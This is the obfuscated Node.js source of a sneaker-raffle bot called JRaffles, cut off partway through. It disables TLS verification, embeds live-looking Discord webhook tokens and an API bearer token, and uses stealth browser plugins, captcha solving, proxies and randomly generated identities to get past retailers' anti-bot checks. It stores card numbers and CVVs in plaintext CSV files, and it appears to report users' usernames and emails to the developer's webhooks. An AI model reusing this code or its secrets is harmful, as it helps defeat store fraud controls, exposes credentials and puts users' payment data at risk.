process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x44f9d7 = require('fs'), _0x469118 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x4a4102(_0x5d4454) {
    const _0x5b8074 = _0x44f9d7['createWriteStream'](_0x5d4454, { 'flags': 'a' }), _0x2bbe8b = console['log'];
    console['log'] = function () {
        const _0x50c096 = Array['prototype']['slice']['call'](arguments), _0x3be7e1 = _0x50c096['join']('\x20') + '\x0a';
        _0x5b8074['write'](_0x3be7e1), _0x2bbe8b['apply'](console, _0x50c096);
    };
}
_0x4a4102('../logs/log\x20' + _0x469118);
var _0x36fa59 = require('tough-cookie'), _0x51270e = require('node-imap'), _0xcd2ad = require('util')['inspect'];
const _0x3bc712 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4fae7e } = require('discord.js');
var _0x18f763 = require('exe');
const { execFile: _0x20d857 } = require('child_process'), _0x256d58 = require('puppeteer-extra'), _0x322fbd = require('cross-spawn'), _0x247b94 = require('puppeteer-extra-plugin-recaptcha'), _0x302cb0 = require('puppeteer-extra-plugin-stealth'), _0xc3fc3 = require('chalk'), _0x38ef83 = require('node-bash-title'), _0x2aead5 = require('axios'), _0x457f0a = require('papaparse');
var _0x5f0928 = require('random-name');
const _0x158f3c = require('request');
var _0x4a9170 = require('prompt');
const _0x5ed650 = _0x158f3c['jar']();
var _0x138f58 = {};
const _0x2b74bd = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x24630e = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x3cf6c6 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x3267d2 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4da3f0 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x43db1f = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x3c4dde = 'https://discord.com/api/webhooks/', _0x16e990 = '' + _0x3c4dde + _0x3cf6c6, _0x1e3801 = '' + _0x3c4dde + _0x3267d2, _0x4bb1d6 = '' + _0x3c4dde + _0x2b74bd, _0x432bcc = '' + _0x3c4dde + _0x24630e, _0x196877 = '' + _0x3c4dde + _0x4da3f0, _0x5855b6 = '' + _0x3c4dde + _0x43db1f;
const _0x586632 = JSON['parse'](_0x44f9d7['readFileSync']('country.json', 'utf-8')), _0x4039e4 = JSON['parse'](_0x44f9d7['readFileSync']('../package.json', 'utf-8')), _0x30d211 = _0x4039e4['version'];
var _0x12faac, _0x2e164b, _0x172c0f, _0x1efa57, _0x559e50, _0x4613fc, _0x9f5859, _0x22d9c8;
const _0x29992f = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x2a1740 = ![];
const _0x299cd3 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4607a9 = '0123456789';
var _0x4b5f11 = _0x299cd3['split']('');
const _0x2268dc = require('auto-git-update'), _0x24bb20 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x48ea90 = new _0x2268dc(_0x24bb20);
async function _0x35ed90() {
    _0x559e50 = _0x44f9d7['readdirSync']('../proxies'), _0x1efa57 = _0x44f9d7['readdirSync']('../tasks'), !_0x44f9d7['existsSync']('../accounts/fenom.csv') && _0x44f9d7['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x44f9d7['existsSync']('../accounts/paypal.csv') && _0x44f9d7['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x44f9d7['existsSync']('../accounts/bstn.csv') && _0x44f9d7['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x44f9d7['existsSync']('../accounts/eql.csv') && _0x44f9d7['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x44f9d7['existsSync']('../failed-tasks.csv') && _0x44f9d7['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x44f9d7['existsSync']('../successful-tasks.csv') && _0x44f9d7['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x138f58 = JSON['parse'](_0x44f9d7['readFileSync']('../settings.json', 'utf-8')), !_0x138f58['delay'] && (_0x138f58['delay'] = 0x3c, _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['threads'] && (_0x138f58['threads'] = 0x1, _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['masterMail'] && (_0x138f58['masterMail'] = 'yourmail@gmail.com', _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['CapSolver'] && (_0x138f58['CapSolver'] = 'yourkeyhere', _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['masterPassword'] && (_0x138f58['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['captchaKey'] && (_0x138f58['captchaKey'] = '', _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['useRandomProxy'] && (_0x138f58['useRandomProxy'] = !![], _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['shuffleTasks'] && (_0x138f58['shuffleTasks'] = ![], _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), !_0x138f58['webhook'] && (_0x138f58['webhook'] = '', _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), _0x138f58['delay'] <= 0x1388 && (_0x138f58['delay'] = _0x138f58['delay'] * 0x3e8), _0x138f58['AfewDelay'] && (delete _0x138f58['AfewDelay'], _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), _0x138f58['MahaDelay'] && (delete _0x138f58['MahaDelay'], _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), _0x138f58['footshopDelay'] && (delete _0x138f58['footshopDelay'], _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58, null, 0x2))), _0x138f58['MahaDelay'] = _0x138f58['delay'], _0x3c4dde = _0x138f58['webhook'], _0x4613fc = _0x138f58['licenseKey'];
}
let _0x163ad9, _0x212832 = [], _0x4d38f2;
const _0x497396 = _0x1cbce1 => new Promise(_0x3fa37a => setTimeout(_0x3fa37a, _0x1cbce1));
function _0x3fb485(_0x318927, _0xfe5e5e) {
    return Math['floor'](Math['random']() * (_0xfe5e5e - _0x318927 + 0x1) + _0x318927);
}
function _0x498355(_0x4294ae) {
    let _0x26dbe4 = _0x4294ae['length'], _0x3295b7;
    while (_0x26dbe4 != 0x0) {
        _0x3295b7 = Math['floor'](Math['random']() * _0x26dbe4), _0x26dbe4--, [_0x4294ae[_0x26dbe4], _0x4294ae[_0x3295b7]] = [
            _0x4294ae[_0x3295b7],
            _0x4294ae[_0x26dbe4]
        ];
    }
    return _0x4294ae;
}
async function _0x1c617e(_0x5f4426) {
    try {
        return _0x2aead5['post']('https://api.whop.com/api/v2/memberships/' + _0x5f4426 + '/validate_license', { 'metadata': { 'key': '' } }, {
            'headers': {
                'Authorization': 'Bearer\x20DRT4qDTPjhk0dbWMnuTDrMuGiUh6MogGpjZL6gSDoLU',
                'Content-Type': 'application/json'
            }
        });
    } catch (_0xd98ca0) {
        console['log']('Error\x20checking\x20license:\x20' + _0xd98ca0['message']);
    }
}
async function _0x16dac5(_0x28e822) {
    console['clear']();
    if (_0x28e822 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x17ed9a = await _0x4a9170['get']('License');
        if (_0x17ed9a['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x497396(0xbb8), _0x16dac5(_0x28e822);
        _0x28e822 = _0x17ed9a['License'], _0x138f58['licenseKey'] = _0x28e822, _0x4613fc = _0x28e822, _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58));
    }
    console['log']('Checking\x20license\x20' + _0x4613fc + '...'), await _0x497396(0x320);
    const _0x5dede5 = await _0x1c617e(_0x28e822);
    _0x9f5859 = JSON['stringify'](_0x5dede5['data']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x22d9c8 = JSON['stringify'](_0x5dede5['data']['discord']['image_url'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x5dede5)
        return console['log']('License\x20not\x20found');
    if (!_0x5dede5['data'])
        return console['log']('License\x20not\x20bound');
    return _0x5dede5['data']['valid'] ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x2a1740 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x2a1740 = ![]);
}
async function _0x53b0dd() {
    var _0x4ae6f3 = await _0x4a9170['get']('Module');
    return console['clear'](), _0x4ae6f3['Module'];
}
;
async function _0x598f58() {
    var _0x563439 = await _0x4a9170['get']('Setting');
    return console['clear'](), _0x563439['Setting'];
}
async function _0x334a9f(_0x3d5f89) {
    var _0x1a38f1 = [];
    for (file of _0x1efa57) {
        var _0x8abe24 = _0x44f9d7['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x457f0a['parse'](_0x8abe24, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x3d5f89['store'] && _0x1a38f1['push'](file);
    }
    !_0x1a38f1['length'] == 0x0 && (_0x1efa57 = _0x1a38f1);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x24d163 = 0x0; _0x24d163 < _0x1efa57['length']; _0x24d163++) {
        console['log']('\x20(' + _0x24d163 + ')\x20' + _0x1efa57[_0x24d163]);
    }
    console['log']('');
    var _0x2660da = await _0x4a9170['get']('Task');
    if (_0x2660da['Task'] > _0x1efa57['length'] - 0x1 || isNaN(_0x2660da['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x497396(0x3e8), _0x334a9f();
    var _0x26c575 = _0x44f9d7['readFileSync']('../tasks/' + _0x1efa57[_0x2660da['Task']], 'utf-8');
    return _0x172c0f = _0x457f0a['parse'](_0x26c575, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xc3fc3['blue'](_0x1efa57[_0x2660da['Task']])), _0x12faac = _0x1efa57[_0x2660da['Task']], _0x172c0f;
}
async function _0xd175ab() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1cf9f4 = 0x0; _0x1cf9f4 < _0x559e50['length']; _0x1cf9f4++) {
        console['log']('\x20(' + _0x1cf9f4 + ')\x20' + _0x559e50[_0x1cf9f4]);
    }
    console['log']('');
    var _0x276bab = await _0x4a9170['get']('Proxies');
    if (_0x276bab['Proxies'] > _0x559e50['length'] - 0x1 || isNaN(_0x276bab['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x497396(0x3e8), _0xd175ab();
    var _0x337b03 = _0x44f9d7['readFileSync']('../proxies/' + _0x559e50[_0x276bab['Proxies']], 'utf-8')['split']('\x0a');
    let _0x1997e7 = _0x337b03['map']((_0x57fa4f, _0x4db0e6) => {
        sanatizeProxy = _0x57fa4f['replace']('\x0d', '');
        if (_0x337b03[_0x4db0e6 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2e164b = _0x559e50[_0x276bab['Proxies']], console['clear'](), _0x1997e7;
}
async function _0x58b5d4() {
    var _0x4c53df = await _0x4a9170['get']('Value');
    return console['clear'](), _0x4c53df['Value'];
}
async function _0x54a78d(_0x22fc6d) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x30cd38 = 0x0; _0x30cd38 < _0x22fc6d['length']; _0x30cd38++) {
        console['log']('\x20(' + _0x30cd38 + ')\x20[' + _0x22fc6d[_0x30cd38]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x185741 = await _0x4a9170['get']('Module');
    return _0x185741['Module'];
}
async function _0x5c7630() {
    var _0x595ba5 = await _0x4a9170['get']('Password');
    return console['clear'](), _0x595ba5['Password'];
}
;
async function _0x3fbab7() {
    var _0x57444e = await _0x4a9170['get']('Links');
    return _0x57444e['Links'];
}
;
async function _0x33819c() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x2c9afc = 0x0; _0x2c9afc < _0x212832['length']; _0x2c9afc++) {
        console['log']('\x20(' + _0x2c9afc + ')\x20' + _0x212832[_0x2c9afc]);
    }
    ;
    console['log']();
    let _0x333fa9 = await _0x4a9170['get']('Product');
    return console['clear'](), _0x333fa9['Product'];
}
;
function _0x5d34e1() {
    var _0x35200a = new Date(Date['now']())['toLocaleTimeString']();
    return _0x35200a;
}
;
function _0x1beba1() {
    var _0x32cb27 = new Date(Date['now']())['toLocaleString']();
    return _0x32cb27['replace'](',', '');
}
async function _0x468b99(_0x250485, _0x4b6291) {
    let _0x21f33c = { 'headers': { 'content-type': 'application/json' } };
    if (_0x30d211 != 'devkey') {
        await _0x2aead5['post'](_0x250485, _0x4b6291, _0x21f33c);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x232baa(_0x194d04, _0x41c208, _0x4aee2e, _0x85b27b, _0x23f7ea) {
    if (!_0x85b27b && _0x4aee2e == 'dev') {
        var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x41c208['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x41c208['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x194d04['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x138f58['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x9f5859,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x194d04['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x194d04['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x30d211,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x10ec02['data'];
    } else {
        if (_0x85b27b && _0x4aee2e == 'dev') {
            var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x41c208['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x9f5859,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x41c208['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x194d04['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x138f58['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x23f7ea,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x194d04['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x194d04['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x30d211,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x10ec02['data'];
        } else {
            if (_0x4aee2e == 'pub') {
                var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x41c208['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x41c208['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x194d04['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x138f58['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x194d04['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x30d211,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x10ec02['data'];
            } else {
                if (_0x4aee2e == 'acc' && !_0x85b27b) {
                    var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x41c208['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x9f5859,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x41c208['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x138f58['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x30d211,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x10ec02['data'];
                } else {
                    if (_0x4aee2e == 'acc' && _0x85b27b) {
                        var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x41c208['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x9f5859,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x23f7ea,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x41c208['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x138f58['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x30d211,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x10ec02['data'];
                    } else {
                        if (_0x4aee2e == 'open') {
                            var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x22d9c8)['addFields']({
                                'name': 'User',
                                'value': '' + _0x9f5859,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x30d211,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x10ec02['data'];
                        } else {
                            if (!_0x85b27b && _0x4aee2e == 'ver') {
                                var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x41c208['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x9f5859,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x41c208['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x138f58['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x30d211,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x10ec02['data'];
                            } else {
                                if (_0x85b27b && _0x4aee2e == 'ver') {
                                    var _0x10ec02 = new _0x4fae7e()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x41c208['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x9f5859,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x23f7ea,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x41c208['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x138f58['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x30d211,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x10ec02['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x494c97(_0xe814ae, _0x2f8939) {
    var _0xfce6f4 = _0xe814ae[_0x2f8939]['Address1']['split'](''), _0x476385 = _0xe814ae[_0x2f8939]['Address2']['split'](''), _0x273222 = _0xe814ae[_0x2f8939]['Email']['split']('@');
    for (var _0x28985f = 0x0; _0x28985f < _0xfce6f4['length']; _0x28985f++) {
        if (_0xfce6f4[_0x28985f] == 'X') {
            var _0x276975 = Math['round'](Math['random']() * (_0x299cd3['length'] - 0x1));
            _0xfce6f4[_0x28985f] = _0x4b5f11[_0x276975];
        }
    }
    ;
    for (var _0x28985f = 0x0; _0x28985f < _0x476385['length']; _0x28985f++) {
        if (_0x476385[_0x28985f] == 'X') {
            var _0x276975 = Math['round'](Math['random']() * (_0x299cd3['length'] - 0x1));
            _0x476385[_0x28985f] = _0x4b5f11[_0x276975];
        }
    }
    ;
    _0xe814ae[_0x2f8939]['FirstName']['toUpperCase']() == 'RANDOM' && (_0xe814ae[_0x2f8939]['FirstName'] = _0x5f0928['first']());
    _0xe814ae[_0x2f8939]['LastName']['toUpperCase']() == 'RANDOM' && (_0xe814ae[_0x2f8939]['LastName'] = _0x5f0928['last']());
    _0x273222[0x0]['toUpperCase']() == 'RANDOM' ? _0x273222[0x0] = '' + _0x5f0928['first']() + _0x5f0928['last']() + _0x3fb485(0x1, 0x3e7) + '@' : _0x273222[0x0] = _0x273222[0x0] + '@';
    _0xe814ae[_0x2f8939]['Email'] = _0x273222['join'](''), _0xe814ae[_0x2f8939]['Address1'] = _0xfce6f4['join'](''), _0xe814ae[_0x2f8939]['Address2'] = _0x476385['join']('');
    _0xe814ae[_0x2f8939]['Phone'] == 'RANDOM' && (_0xe814ae[_0x2f8939]['Phone'] = '0' + _0x3fb485(0x5f5e100, 0x3b9ac9ff));
    if (_0xe814ae[_0x2f8939]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0xd71dc2 = _0x3fb485(0x1, 0x270f);
        _0xe814ae[_0x2f8939]['Follower'] = '' + _0x5f0928['first']() + _0x5f0928['last']() + _0xd71dc2 + '\x20';
    }
    _0xe814ae[_0x2f8939]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0xe814ae[_0x2f8939]['HouseNumber'] = _0x3fb485(0x1, 0xc8));
    if (_0xe814ae[_0x2f8939]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x15b270 = Math['round'](Math['random']() * (_0x299cd3['length'] - 0x1)), _0x55faac = _0x4b5f11[_0x15b270];
        _0xe814ae[_0x2f8939]['Address1'] = _0x5f0928['last']() + 'straat', _0xe814ae[_0x2f8939]['Zip'] == '' && (_0xe814ae[_0x2f8939]['Postcode'] = _0x3fb485(0x3e8, 0x270f) + '\x20' + _0x55faac + _0x55faac, _0xe814ae[_0x2f8939]['Zip'] = _0xe814ae[_0x2f8939]['Postcode']), _0xe814ae[_0x2f8939]['HouseNumber'] = '' + _0x3fb485(0x1, 0xc8);
    }
    return;
}
;
async function _0x554010(_0x363fdc, _0x599c48) {
    _0x44f9d7['appendFileSync']('../failed-tasks.csv', _0x1beba1() + ',' + _0x599c48['store'] + ',' + _0x599c48['name'] + ',' + _0x363fdc['Url'] + ',' + _0x363fdc['Size'] + ',' + _0x363fdc['Follower'] + ',' + _0x363fdc['FirstName'] + ',' + _0x363fdc['LastName'] + ',' + _0x363fdc['Address1'] + ',' + _0x363fdc['Address2'] + ',' + _0x363fdc['HouseNumber'] + ',' + _0x363fdc['Zip'] + ',' + _0x363fdc['City'] + ',' + _0x363fdc['State'] + ',' + _0x363fdc['Country'] + ',' + _0x363fdc['Phone'] + ',' + _0x363fdc['Email'] + ',' + _0x363fdc['Password'] + ',' + _0x363fdc['PaymentMethod'] + ',' + _0x363fdc['CardType'] + ',' + _0x363fdc['NameOnCard'] + ',' + _0x363fdc['CardNumber'] + ',' + _0x363fdc['ExpiryDate'] + ',' + _0x363fdc['CVV'] + ',' + _0x363fdc['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0xf67db6(_0x5ae455, _0x25d2a8) {
    _0x44f9d7['appendFileSync']('../successful-tasks.csv', _0x1beba1() + ',' + _0x25d2a8['store'] + ',' + _0x25d2a8['name'] + ',' + _0x5ae455['Url'] + ',' + _0x5ae455['Size'] + ',' + _0x5ae455['Follower'] + ',' + _0x5ae455['FirstName'] + ',' + _0x5ae455['LastName'] + ',' + _0x5ae455['Address1'] + ',' + _0x5ae455['Address2'] + ',' + _0x5ae455['HouseNumber'] + ',' + _0x5ae455['Zip'] + ',' + _0x5ae455['City'] + ',' + _0x5ae455['State'] + ',' + _0x5ae455['Country'] + ',' + _0x5ae455['Phone'] + ',' + _0x5ae455['Email'] + ',' + _0x5ae455['Password'] + ',' + _0x5ae455['PaymentMethod'] + ',' + _0x5ae455['CardType'] + ',' + _0x5ae455['NameOnCard'] + ',' + _0x5ae455['CardNumber'] + ',' + _0x5ae455['ExpiryDate'] + ',' + _0x5ae455['CVV'] + ',' + _0x5ae455['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x4024ca() {
    let _0x3c4c9e = proxyFile['split']('\x0a'), _0xaa75cd = _0x3c4c9e['map']((_0x545c93, _0x5ec4bb) => {
        sanatizeProxy = _0x545c93['replace']('\x0d', '');
        if (_0x3c4c9e[_0x5ec4bb + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0xaa75cd;
}
;
async function _0x3573c7(_0x1f11b3, _0x16e4e9) {
    if (_0x393b93 != 'yes')
        var _0x393b93 = '', _0x352316 = 0x0;
    async function _0x272aa7() {
        var _0x6cd33e = _0x44f9d7['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x3e1501 = _0x457f0a['parse'](_0x6cd33e, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x58ed1c = 0x0; _0x58ed1c < _0x3e1501['length']; _0x58ed1c++) {
            console['log']('(' + _0x58ed1c + ')\x20' + _0x3e1501[_0x58ed1c]['Email']);
        }
        console['log']('\x0a(' + _0x3e1501['length'] + ')\x20' + _0xc3fc3['cyan']('Add\x20a\x20new\x20account'));
        let _0x1675b4 = await _0x4a9170['get']('Option');
